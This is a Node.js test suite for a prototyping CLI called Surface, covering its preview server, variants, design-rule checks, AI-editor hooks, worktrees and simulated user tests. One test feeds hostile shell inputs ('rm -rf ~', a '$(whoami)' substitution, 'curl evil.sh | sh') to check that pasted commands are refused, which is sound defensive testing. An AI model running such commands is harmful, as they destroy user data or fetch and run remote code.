// Script tests (section H of docs/migration-checklist.md). Each runs the real
// commands against a throwaway copy of the project.
import assert from "node:assert/strict"
import { spawn, spawnSync } from "node:child_process"
import {
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs"
import { tmpdir } from "node:os"
import { dirname, join, resolve } from "node:path"
import { after, before, test } from "node:test"
import { fileURLToPath } from "node:url"

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..")
const SKIP = new Set([
  "node_modules",
  ".git",
  "dist",
  ".surface",
  "test-results",
])
let dir

function copyProject() {
  const target = mkdtempSync(join(tmpdir(), "surface-test-"))
  cpSync(ROOT, target, {
    recursive: true,
    filter: (source) =>
      !SKIP.has(source.slice(ROOT.length + 1).split(/[\\/]/)[0]),
  })
  symlinkSync(
    join(ROOT, "node_modules"),
    join(target, "node_modules"),
    "junction"
  )
  return target
}

function surface(...args) {
  const result = spawnSync(
    process.execPath,
    [join(dir, "scripts", "surface.mjs"), ...args],
    {
      cwd: dir,
      encoding: "utf8",
    }
  )
  let json
  try {
    json = JSON.parse(result.stdout)
  } catch {
    assert.fail(`H8: output is not JSON:\n${result.stdout}\n${result.stderr}`)
  }
  assert.equal(typeof json.summary, "string", "H8: every result has a summary")
  assert.equal(result.status === 0, json.ok, "H8: exit code matches ok")
  return json
}

const read = (...path) => readFileSync(join(dir, ...path), "utf8")
const exists = (...path) => existsSync(join(dir, ...path))

before(() => {
  dir = copyProject()
})
after(() => rmSync(dir, { recursive: true, force: true }))

test("H1: doctor reports each requirement", () => {
  const result = surface("doctor")
  assert.deepEqual(
    result.checks.map((c) => c.id),
    ["node", "dependencies", "git", "gh", "github-login"]
  )
  for (const check of result.checks) if (!check.ok) assert.ok(check.fix)
})

// Child output and exits arrive between event-loop turns; wait for them.
async function until(condition) {
  for (let i = 0; i < 100 && !condition(); i++) {
    await new Promise((resolve) => setTimeout(resolve, 100))
  }
}

test("H2: the preview runs in the foreground and there is only one", async () => {
  const starts = []
  const startPreview = () => {
    const child = spawn(
      process.execPath,
      [join(dir, "scripts", "surface.mjs"), "dev", "start", "--no-open"],
      { cwd: dir, stdio: ["ignore", "pipe", "pipe"] }
    )
    const record = { child, output: "", exited: false }
    child.stdout.on("data", (chunk) => (record.output += chunk))
    child.on("exit", () => (record.exited = true))
    starts.push(record)
    return record
  }
  try {
    const first = startPreview()
    const on = surface("dev", "status", "--wait")
    assert.equal(on.running, true)
    assert.equal(first.exited, false, "start stays in the foreground")
    await until(() => first.output.includes("Address"))
    assert.match(first.output, /The preview is on\. Address: http/)

    const second = startPreview()
    await until(() => first.exited)
    assert.equal(first.exited, true, "a new start stops the old preview")
    const again = surface("dev", "status", "--wait")
    assert.equal(again.url, on.url, "the address stays the same")
    assert.equal(second.exited, false)
    await until(() => second.output.includes("Address"))
    assert.match(second.output, /I stopped the preview that was on/)

    assert.equal(surface("dev", "stop").stopped, 1)
    await until(() => second.exited)
    assert.equal(second.exited, true)
    assert.equal(surface("dev", "status").running, false)
    assert.equal(surface("dev", "stop").stopped, 0, "stop is safe when off")
  } finally {
    for (const { child } of starts) child.kill()
  }
})

test("H3: prototype new validates names and refuses duplicates", () => {
  assert.equal(surface("prototype", "new", "Bad Name/x").ok, false)
  assert.equal(surface("prototype", "new", "only-one-part").ok, false)
  const created = surface(
    "prototype",
    "new",
    "demo/flow",
    "--description",
    "Test"
  )
  assert.equal(created.url, "/demo/flow")
  assert.ok(exists("prototypes/demo/flow/prototype.tsx"))
  assert.equal(surface("prototype", "new", "demo/flow").ok, false)
  assert.ok(
    surface("prototype", "list").prototypes.some((p) => p.id === "demo/flow")
  )
})

test("H4: variants of every kind can be added, renamed, re-defaulted and deleted", () => {
  const config = () => read("prototypes/demo/flow/prototype.config.ts")
  surface("variant", "add", "demo/flow", "hero", "--kind", "component", "split")
  surface("variant", "add", "flow", "hero", "stacked")
  surface("variant", "add", "flow", "tone", "--kind", "enum", "calm")
  surface("variant", "add", "flow", "tone", "loud")
  surface("variant", "add", "flow", "chat-style", "--kind", "bool")
  surface("variant", "add", "flow", "data", "--kind", "fixture", "empty")
  surface("variant", "add", "flow", "data", "full")
  assert.equal(
    surface("variant", "add", "flow", "tone", "loud").ok,
    false,
    "duplicate option"
  )
  assert.equal(
    surface("variant", "add", "flow", "nokind", "x").ok,
    false,
    "kind required"
  )

  const listed = Object.fromEntries(
    surface("variant", "list", "flow").variants.map((v) => [v.axis, v])
  )
  assert.deepEqual(listed.hero.values, ["split", "stacked"])
  assert.deepEqual(listed.tone.values, ["calm", "loud"])
  assert.equal(listed["chat-style"].kind, "bool")
  assert.deepEqual(listed.data.values, ["empty", "full"])
  assert.match(config(), /"chat-style": boolProp/)

  surface("variant", "rename", "flow", "tone", "calm", "quiet")
  assert.match(
    config(),
    /enumProp\(\["quiet", "loud"\], \{ default: "quiet" \}\)/
  )
  surface("variant", "rename", "flow", "hero", "split", "side-by-side")
  assert.ok(exists("prototypes/demo/flow/variants/hero/side-by-side.tsx"))
  assert.match(config(), /componentProp\(\{ default: "side-by-side" \}\)/)

  surface("variant", "set-default", "flow", "tone", "loud")
  surface("variant", "set-default", "flow", "chat-style", "true")
  assert.match(config(), /default: "loud"/)
  assert.match(config(), /boolProp\(\{ default: true \}\)/)
  assert.equal(
    surface("variant", "set-default", "flow", "tone", "nope").ok,
    false
  )

  const preview = surface("variant", "delete", "flow", "data", "full")
  assert.equal(preview.confirm, true, "delete asks first")
  assert.match(config(), /full:/)
  assert.equal(
    surface("variant", "delete", "flow", "tone", "loud", "--yes").ok,
    false,
    "deleting the default needs a new default"
  )
  surface(
    "variant",
    "delete",
    "flow",
    "tone",
    "loud",
    "--yes",
    "--new-default",
    "quiet"
  )
  assert.match(config(), /enumProp\(\["quiet"\], \{ default: "quiet" \}\)/)
  assert.equal(
    surface("variant", "delete", "flow", "tone", "quiet", "--yes").ok,
    false,
    "last option"
  )

  surface("variant", "delete", "flow", "hero", "--yes")
  assert.ok(!exists("prototypes/demo/flow/variants"), "component files removed")
  surface("variant", "delete", "flow", "tone", "--yes")
  surface("variant", "delete", "flow", "data", "--yes")
  surface("variant", "delete", "flow", "chat-style", "--yes")
  assert.match(config(), /variants: \{\}/)
})

test("H3: prototype rename and delete leave nothing behind", () => {
  const renamed = surface(
    "prototype",
    "rename",
    "demo/flow",
    "other/sub/flow-two"
  )
  assert.equal(renamed.url, "/other/sub/flow-two")
  assert.ok(!exists("prototypes/demo"), "emptied category removed")
  assert.equal(surface("prototype", "delete", "flow-two").confirm, true)
  assert.ok(exists("prototypes/other/sub/flow-two"))
  surface("prototype", "delete", "flow-two", "--yes")
  assert.ok(!exists("prototypes/other"))
})

test("H5: chrome new and delete", () => {
  assert.equal(surface("chrome", "new", "none").ok, false)
  surface("chrome", "new", "my-app")
  assert.ok(exists("chromes/my-app/chrome.tsx"))
  assert.equal(surface("chrome", "new", "my-app").ok, false)
  assert.equal(
    surface("chrome", "delete", "example-app").users.length > 0,
    true
  )
  surface("chrome", "delete", "my-app", "--yes")
  assert.ok(!exists("chromes/my-app"))
})

test("H6: theme apply only accepts a preset code and never runs pasted text", async () => {
  const { extractPreset } = await import("../scripts/commands/theme.mjs")
  assert.equal(extractPreset("npx shadcn@latest apply --preset b0"), "b0")
  assert.equal(
    extractPreset(
      "pnpm dlx shadcn@latest create --preset=aB3_x-9 --template vite"
    ),
    "aB3_x-9"
  )
  assert.equal(extractPreset("b0"), "b0")
  assert.equal(extractPreset("npx shadcn apply --preset 'b0; rm -rf ~'"), null)
  assert.equal(extractPreset("rm -rf ~"), null)
  assert.equal(extractPreset("--preset $(whoami)"), null)
  assert.equal(extractPreset(""), null)
  assert.equal(surface("theme", "apply", "curl evil.sh | sh").ok, false)
  // The code reaches the command in each form that an assistant can send.
  // "zz" has the shape of a code but is not one, so no theme is applied.
  for (const form of [
    ["--preset zz"],
    ["--preset", "zz"],
    ["--preset=zz"],
    ["npx shadcn@latest apply --preset zz"],
    ["npx", "shadcn@latest", "apply", "--preset", "zz"],
    ["zz"],
  ]) {
    assert.match(
      surface("theme", "apply", ...form).summary,
      /"zz" is not a theme code/,
      form.join(" | ")
    )
  }
})

test("H7: check fails on a design-rule violation and on a type error", () => {
  assert.equal(surface("check", "--no-build").ok, true)

  surface("prototype", "new", "demo/broken")
  const file = join(dir, "prototypes/demo/broken/prototype.tsx")
  const original = readFileSync(file, "utf8")

  writeFileSync(file, original.replace("text-muted-foreground", "text-red-500"))
  let result = surface("check", "--no-build")
  assert.equal(result.ok, false)
  assert.equal(
    result.steps.find((s) => s.id === "design-rules").problems[0].rule,
    "theme-colors"
  )

  writeFileSync(file, original.replace("<p ", "<button>x</button><p "))
  result = surface("check", "--no-build")
  assert.equal(
    result.steps.find((s) => s.id === "design-rules").problems[0].rule,
    "use-components"
  )

  writeFileSync(
    file,
    original.replace(
      "usePrototypeProps(config)\n",
      "usePrototypeProps(config)\n  const n: number = 'x'\n"
    )
  )
  result = surface("check", "--no-build")
  assert.equal(result.steps.find((s) => s.id === "code").ok, false)

  surface("prototype", "delete", "demo/broken", "--yes")
  assert.equal(surface("check", "--no-build").ok, true)
})

test("L1 L2: the rules find hand-made components and one-off tokens", async () => {
  const { checkText } = await import("../scripts/lib/design-rules.mjs")
  const rulesFor = (line) =>
    checkText("prototypes/a/b/prototype.tsx", line).map((p) => p.rule)

  // Components.
  for (const element of [
    "button",
    "input",
    "select",
    "textarea",
    "table",
    "label",
    "hr",
    "kbd",
  ]) {
    assert.deepEqual(rulesFor(`<${element} />`), ["use-components"], element)
  }
  assert.deepEqual(rulesFor('<div role="dialog">'), ["use-components"])
  assert.deepEqual(rulesFor("function Card() {"), ["no-new-components"])
  assert.deepEqual(rulesFor("const Badge = () => null"), ["no-new-components"])
  assert.deepEqual(rulesFor("function ProjectCard() {"), [])
  assert.deepEqual(rulesFor("<Button>Save</Button>"), [])

  // Tokens.
  assert.deepEqual(rulesFor('<div className="bg-blue-500" />'), [
    "theme-colors",
  ])
  assert.deepEqual(rulesFor('<div className="text-white" />'), ["theme-colors"])
  assert.deepEqual(rulesFor('const c = "#ff0000"'), ["theme-colors"])
  assert.deepEqual(rulesFor('<div className="p-[7px] text-[13px]" />'), [
    "theme-tokens",
    "theme-tokens",
  ])
  assert.deepEqual(rulesFor('<div className="rounded-[10px]" />'), [
    "theme-tokens",
  ])
  assert.deepEqual(rulesFor("<div style={{ fontSize: 13 }} />"), [
    "theme-tokens",
  ])
  assert.deepEqual(rulesFor('<div style={{ "--brand": "x" }} />'), [
    "theme-tokens",
  ])
  assert.deepEqual(rulesFor('<div className="bg-(--made-up)" />'), [
    "theme-tokens",
  ])

  // Permitted.
  assert.deepEqual(
    rulesFor('<div className="bg-primary p-4 text-sm rounded-lg" />'),
    []
  )
  assert.deepEqual(
    rulesFor('<div className="w-[372px] max-w-[60ch] [&>svg]:size-4" />'),
    []
  )
  assert.deepEqual(
    rulesFor('<div className="p-[var(--spacing)] bg-(--primary)" />'),
    []
  )
  assert.deepEqual(
    rulesFor('<div style={{ "--sidebar-width": "20rem" }} />'),
    []
  )
  assert.deepEqual(rulesFor("<div style={{ width: 300 }} />"), [])
  assert.deepEqual(rulesFor('const rows = [{ color: "red", gap: 3 }]'), [])
  assert.deepEqual(
    rulesFor('<button className="bg-red-500" /> {/* surface-allow */}'),
    []
  )
  assert.deepEqual(rulesFor('// <button className="bg-red-500">'), [])
})

test("L3 L4 L5: one hook gives the problems to Claude Code, Codex and Cursor", () => {
  surface("prototype", "new", "demo/hooked")
  const file = "prototypes/demo/hooked/prototype.tsx"
  writeFileSync(
    join(dir, file),
    'export default function Hooked() {\n  return <button className="bg-red-500 p-[7px]">x</button>\n}\n'
  )
  const hook = (harness, event, input) =>
    spawnSync(
      process.execPath,
      [join(dir, "scripts", "hooks", "design-check.mjs"), harness, event],
      {
        cwd: dir,
        encoding: "utf8",
        input: typeof input === "string" ? input : JSON.stringify(input),
      }
    )

  // Claude Code: exit code 2, and the text on stderr goes to the assistant.
  let result = hook("claude", "edit", {
    cwd: dir,
    tool_name: "Edit",
    tool_input: { file_path: join(dir, file) },
  })
  assert.equal(result.status, 2)
  assert.match(result.stderr, /3 problems/)
  assert.match(result.stderr, /Use Button from @\/components\/ui\/button/)

  // Codex: the file name is in the patch text.
  result = hook("codex", "edit", {
    tool_name: "apply_patch",
    tool_input: {
      command: `*** Begin Patch\n*** Update File: ${file}\n@@\n-a\n+b\n*** End Patch`,
    },
  })
  assert.equal(result.status, 2)
  assert.match(result.stderr, /theme-tokens/)

  // Cursor: JSON on stdout.
  result = hook("cursor", "edit", {
    tool_name: "Write",
    tool_input: { path: file },
  })
  assert.equal(result.status, 0)
  assert.match(JSON.parse(result.stdout).additional_context, /3 problems/)

  // Stop hooks ask one time, then let the assistant stop.
  assert.equal(hook("claude", "stop", {}).status, 2)
  assert.equal(hook("claude", "stop", { stop_hook_active: true }).status, 0)
  assert.equal(hook("codex", "stop", { stop_hook_active: false }).status, 2)
  assert.match(
    JSON.parse(hook("cursor", "stop", { loop_count: 0 }).stdout)
      .followup_message,
    /Repair them now/
  )
  assert.equal(hook("cursor", "stop", { loop_count: 1 }).stdout, "")

  // No noise, and no failure, for other files or bad input.
  result = hook("claude", "edit", {
    tool_input: { file_path: join(dir, "surface/Shell.tsx") },
  })
  assert.equal(result.status, 0)
  assert.equal(result.stderr, "")
  assert.equal(hook("claude", "edit", "not json").status, 0)

  assert.equal(surface("lint", file).problems.length, 3)
  surface("prototype", "delete", "demo/hooked", "--yes")
  assert.equal(hook("claude", "stop", {}).status, 0)
  assert.equal(surface("lint").ok, true)
})

test("W1 W2 W3: a worktree does not collide with the main folder", () => {
  const main = copyProject()
  try {
    const git = (...args) => {
      const result = spawnSync(
        "git",
        ["-c", "user.name=Test", "-c", "user.email=test@example.com", ...args],
        { cwd: main, encoding: "utf8" }
      )
      assert.equal(result.status, 0, result.stderr)
      return result.stdout.trim()
    }
    const command = (cwd, ...args) =>
      JSON.parse(
        spawnSync(
          process.execPath,
          [join(cwd, "scripts", "surface.mjs"), ...args],
          { cwd, encoding: "utf8" }
        ).stdout
      )
    git("init", "--initial-branch", "main")
    git("add", "--all")
    git("commit", "--message", "First version")
    const tree = join(main, ".claude", "worktrees", "second")
    git("worktree", "add", tree, "-b", "second")

    // W1: Git in the main folder does not see the worktree.
    assert.equal(git("status", "--porcelain"), "")

    // W2: the hook of the main folder examines a file in the worktree.
    const file = join(tree, "prototypes", "demo", "bad.tsx")
    mkdirSync(dirname(file), { recursive: true })
    writeFileSync(
      file,
      'export default function Bad() {\n  return <button className="bg-red-500">x</button>\n}\n'
    )
    const hook = (event, input) =>
      spawnSync(
        process.execPath,
        [join(main, "scripts", "hooks", "design-check.mjs"), "claude", event],
        { cwd: main, encoding: "utf8", input: JSON.stringify(input) }
      )
    let result = hook("edit", { cwd: main, tool_input: { file_path: file } })
    assert.equal(result.status, 2)
    assert.match(result.stderr, /prototypes\/demo\/bad\.tsx/)
    assert.equal(hook("stop", { cwd: tree }).status, 2)
    assert.equal(hook("stop", { cwd: main }).status, 0)

    // W3: the worktree reads the link of the main folder and does not publish.
    command(main, "ship", "set-url", "https://example.pages.dev")
    assert.equal(
      command(tree, "ship", "status").liveUrl,
      "https://example.pages.dev"
    )
    const shipped = command(tree, "ship")
    assert.equal(shipped.ok, false)
    assert.equal(shipped.needs, "main-folder")
    assert.equal(realpathSync(shipped.mainFolder), realpathSync(main))
    assert.equal(git("rev-list", "--count", "--all"), "1")
  } finally {
    rmSync(main, { recursive: true, force: true })
  }
})

test("L6: each hook config is valid and starts the shared script", () => {
  const claude = JSON.parse(read(".claude/settings.json"))
  const codex = JSON.parse(read(".codex/hooks.json"))
  const cursor = JSON.parse(read(".cursor/hooks.json"))
  const commands = [
    claude.hooks.PostToolUse[0].hooks[0].command,
    claude.hooks.Stop[0].hooks[0].command,
    codex.hooks.PostToolUse[0].hooks[0].command,
    codex.hooks.Stop[0].hooks[0].command,
    cursor.hooks.postToolUse[0].command,
    cursor.hooks.stop[0].command,
  ]
  for (const command of commands) {
    assert.match(
      command,
      /scripts\/hooks\/design-check\.mjs"? (claude|codex|cursor) (edit|stop)$/
    )
  }
  assert.equal(cursor.version, 1)
})

test("M1 M2 M3: train changes only the direction section and refuses specific rules", () => {
  const before = read("AGENTS.md")
  const outside = (text) =>
    text.replace(
      /<!-- surface-train:start -->[\s\S]*<!-- surface-train:end -->/,
      ""
    )

  assert.equal(
    surface("train", "list").summary,
    "The project has 0 directives."
  )
  assert.equal(
    surface("train", "add", "Show an empty state for each list.").ok,
    false,
    "group required"
  )

  const added = surface(
    "train",
    "add",
    "--group",
    "design",
    "Show an empty state for each list. Then the first use of a screen is clear."
  )
  assert.equal(added.directives.design[0].id, "D1")
  surface(
    "train",
    "add",
    "--group",
    "build",
    "Make each section of a page a component. Then a variant is quick to make."
  )
  assert.match(read("AGENTS.md"), /### Design\n\n- Show an empty state/)
  assert.match(read("AGENTS.md"), /### Build\n\n- Make each section/)
  assert.equal(
    outside(read("AGENTS.md")),
    outside(before),
    "the other parts do not change"
  )

  for (const specific of [
    "Move the button in prototypes/examples/dashboard/prototype.tsx.",
    "In the dashboard prototype, use a table.",
    "Make the sidebar of the example-app chrome dark.",
    "Use 12px of space between cards.",
    "Use #ff0000 for errors.",
  ]) {
    const refused = surface("train", "add", "--group", "design", specific)
    assert.equal(refused.ok, false, specific)
    assert.ok(refused.reasons.length > 0)
  }
  assert.equal(
    surface(
      "train",
      "add",
      "--group",
      "design",
      "Use 12px of space between cards.",
      "--force"
    ).ok,
    true
  )
  assert.equal(
    surface(
      "train",
      "add",
      "--group",
      "design",
      "Show an empty state for each list. Then the first use of a screen is clear."
    ).ok,
    false,
    "duplicate"
  )

  const replaced = surface(
    "train",
    "replace",
    "D2",
    "Use compact density for data tables. Our users compare many rows."
  )
  assert.equal(
    replaced.directives.design[1].text,
    "Use compact density for data tables. Our users compare many rows."
  )
  assert.equal(surface("train", "remove", "D9").ok, false)

  let last
  for (let i = 0; i < 9; i++) {
    last = surface(
      "train",
      "add",
      "--group",
      "design",
      `Principle number ${"abcdefghi"[i]} for all screens. It has a cause.`
    )
  }
  assert.match(last.warnings.join(" "), /limit is 10/)
  const long = surface(
    "train",
    "add",
    "--group",
    "build",
    Array(45).fill("word").join(" ") + "."
  )
  assert.match(long.warnings.join(" "), /45 words/)

  for (let i = 0; i < 11; i++) surface("train", "remove", "D1")
  surface("train", "remove", "B2")
  surface("train", "remove", "B1")
  assert.equal(
    read("AGENTS.md"),
    before,
    "the file is the same after all directives are removed"
  )
})

test("N1 N2: personas and tasks are validated before they are saved", () => {
  const incomplete = surface("test", "persona", "new", "night-nurse")
  assert.equal(incomplete.ok, false)
  assert.equal(incomplete.missing.length, 9, "N1: each missing flag is named")
  assert.ok(!exists("user-tests/personas/night-nurse.json"))

  const flags = [
    ["backstory", "I work at night and I use my phone between two tasks."],
    ["search", "browse-first"],
    ["reading", "scans"],
    ["exploration", "linear"],
    ["scent", "high"],
    ["effort", "low"],
    ["recovery", "backtracks"],
    ["persistence", "medium"],
    ["patience", "4"],
  ].flatMap(([flag, value]) => [`--${flag}`, value])
  assert.equal(
    surface("test", "persona", "new", "night-nurse", ...flags).ok,
    true
  )
  assert.equal(
    surface("test", "persona", "new", "night-nurse", ...flags).ok,
    false,
    "N1: a duplicate needs --replace"
  )
  assert.ok(
    surface("test", "persona", "list").personas.some(
      (persona) => persona.name === "night-nurse" && persona.patience === 4
    )
  )

  const task = (...args) =>
    surface("test", "task", "new", "place-order", "--goal", "Pay.", ...args)
  assert.equal(task("--signal", "Done.").ok, false, "N2: needs a prototype")
  assert.equal(
    task("--prototype", "examples/nope", "--signal", "Done.").ok,
    false
  )
  const wrongPage = task(
    "--prototype",
    "mobile-checkout",
    "--signal",
    "Done.",
    "--end-page",
    "nope"
  )
  assert.match(wrongPage.missing.join(" "), /confirmation/)
  assert.equal(
    task(
      "--prototype",
      "mobile-checkout",
      "--signal",
      "Done.",
      "--variants",
      "nope=1"
    ).ok,
    false,
    "N2: a variant must exist"
  )
  const made = task(
    "--prototype",
    "mobile-checkout",
    "--signal",
    "The screen says that the order is placed.",
    "--end-page",
    "confirmation",
    "--interactions",
    "Email field; Pay button"
  )
  assert.equal(made.task.prototype, "examples/mobile-checkout")
  assert.deepEqual(made.task.success.interactions, [
    "Email field",
    "Pay button",
  ])

  const ask = surface("test", "task", "delete", "place-order")
  assert.equal(ask.confirm, true)
  assert.ok(
    exists("user-tests/tasks/place-order.json"),
    "N2: no delete without --yes"
  )
})

test("N3 N4 N5: a user test runs in a browser, counts patience and writes a report", async (t) => {
  assert.equal(
    surface(
      "test",
      "start",
      "--persona",
      "night-nurse",
      "--task",
      "place-order"
    ).ok,
    false,
    "N3: a user test needs the preview"
  )
  const preview = spawn(
    process.execPath,
    [join(dir, "scripts", "surface.mjs"), "dev", "start", "--no-open"],
    { cwd: dir, stdio: "ignore" }
  )
  try {
    assert.equal(surface("dev", "status", "--wait").running, true)
    const started = surface(
      "test",
      "start",
      "--persona",
      "night-nurse",
      "--task",
      "place-order",
      "--variants",
      "button=inline"
    )
    if (!started.ok && started.fix) {
      t.skip("no browser is installed for Playwright")
      return
    }
    assert.equal(started.device, "phone", "N3: the device of the prototype")
    assert.match(started.briefing, /I work at night/)
    assert.ok(
      !/confirmation|order is placed/.test(started.briefing),
      "N3: the briefing has no success conditions"
    )
    assert.ok(exists(started.screenshot))
    const pay = started.controls.find((control) => /^Pay/.test(control.name))
    const email = started.controls.find((control) => control.name === "Email")
    assert.ok(pay && email, "N3: the result lists the controls on the screen")
    assert.equal(
      surface(
        "test",
        "start",
        "--persona",
        "night-nurse",
        "--task",
        "place-order"
      ).ok,
      false,
      "N3: there is only one user test at a time"
    )

    const says = "I want to pay. This button says Pay, so I press it."
    assert.equal(
      surface("test", "click", pay.ref).ok,
      false,
      "N4: needs --says"
    )
    assert.equal(surface("test", "click", "e99", "--says", says).ok, false)
    assert.equal(surface("test", "scroll", "down").patience.remaining, 4)
    const typed = surface(
      "test",
      "type",
      email.ref,
      "a@example.com",
      "--says",
      says
    )
    assert.equal(typed.patience.remaining, 3, "N4: a text entry costs 1")
    assert.equal(
      typed.controls.find((control) => control.name === "Email").value,
      "a@example.com"
    )
    const paid = surface("test", "click", pay.ref, "--says", says)
    assert.equal(
      paid.page,
      "/examples/mobile-checkout/confirmation?button=inline"
    )
    assert.match(paid.text, /Payment received/)
    surface("test", "back", "--says", says)
    const last = surface("test", "key", "Tab", "--says", says)
    assert.equal(last.patience.remaining, 0)
    const refused = surface("test", "key", "Tab", "--says", says)
    assert.equal(refused.ok, false, "N4: no action when the patience is 0")
    assert.match(refused.summary, /patience is 0/)

    assert.equal(surface("test", "finding", "--type", "nope").ok, false)
    const finding = [
      "test",
      "finding",
      "--type",
      "dead-end",
      "--severity",
      "warning",
      "--description",
      "The Tab key did not move me to a control that I could see.",
    ]
    assert.equal(surface(...finding).findings, 1)
    assert.equal(surface(...finding).findings, 1, "N5: no duplicate finding")

    const ended = surface(
      "test",
      "end",
      "--outcome",
      "abandoned",
      "--summary",
      "I paid, then I lost my place.",
      "--no-open"
    )
    assert.equal(ended.reachedEndPage, true)
    assert.equal(ended.success.endPage, "confirmation")
    assert.equal(ended.findings.length, 1)
    assert.match(read(ended.report), /The Tab key did not move me/)
    assert.match(read(ended.report), /└ 1\. button/)
    assert.match(read(ended.report), /├ a\. sticky \(default\)</)
    assert.match(read(ended.report), /└ b\. inline ✓/)
    assert.equal(surface("test", "status").running, false)
    assert.equal(surface("test", "runs").runs[0].outcome, "abandoned")
    assert.equal(surface("test", "look").ok, false, "N5: the browser is off")
  } finally {
    surface("test", "stop")
    preview.kill()
  }
})

test("I2: skill copies match the originals", () => {
  assert.equal(surface("skills", "check").ok, true)
})

test("J9 J10: update replaces only Surface's files and backs up local edits", () => {
  // A newer release, made from a second copy.
  const release = copyProject()
  try {
    const pkg = JSON.parse(readFileSync(join(release, "package.json"), "utf8"))
    pkg.version = "99.0.0"
    pkg.dependencies["left-pad"] = "1.3.0"
    writeFileSync(join(release, "package.json"), JSON.stringify(pkg, null, 2))
    writeFileSync(
      join(release, "surface", "NEW_FILE.md"),
      "new in this release\n"
    )
    spawnSync(
      process.execPath,
      [join(release, "scripts", "surface.mjs"), "manifest", "build"],
      { cwd: release }
    )

    surface("manifest", "build")
    const mine = "prototypes/examples/dashboard/prototype.tsx"
    writeFileSync(join(dir, mine), read(mine) + "\n// my work\n")
    writeFileSync(
      join(dir, "surface/Shell.tsx"),
      read("surface/Shell.tsx") + "\n// local edit\n"
    )
    surface(
      "train",
      "add",
      "--group",
      "design",
      "Show an empty state for each list. Then the first use is clear."
    )
    const before = {
      prototype: read(mine),
      chrome: read("chromes/example-app/chrome.tsx"),
      theme: read("src/theme.css"),
      config: read("surface.config.ts"),
    }

    const dry = surface("update", "--from", release, "--dry-run")
    assert.equal(dry.to, "99.0.0")
    assert.deepEqual(dry.editedFilesThatWouldBeReplaced, ["surface/Shell.tsx"])
    // M4: the directive is not an edit of a Surface file.
    assert.ok(!exists("surface/NEW_FILE.md"), "dry run changes nothing")

    // Installing packages is left out: this copy shares the real node_modules.
    const result = surface("update", "--from", release, "--no-install")
    assert.equal(result.updated, true)
    assert.ok(exists("surface/NEW_FILE.md"))
    assert.ok(!read("surface/Shell.tsx").includes("// local edit"))
    assert.deepEqual(result.replacedEditedFiles, ["surface/Shell.tsx"])
    assert.match(result.warning, /\.surface[\\/]backup/)
    assert.equal(read(mine), before.prototype)
    assert.equal(read("chromes/example-app/chrome.tsx"), before.chrome)
    assert.equal(read("src/theme.css"), before.theme)
    assert.equal(read("surface.config.ts"), before.config)
    assert.match(
      read("AGENTS.md"),
      /- Show an empty state for each list\./,
      "M4: the update keeps the directives"
    )
    assert.equal(
      JSON.parse(read("package.json")).dependencies["left-pad"],
      "1.3.0"
    )
    assert.equal(JSON.parse(read("package.json")).version, "99.0.0")
  } finally {
    rmSync(release, { recursive: true, force: true })
  }
})
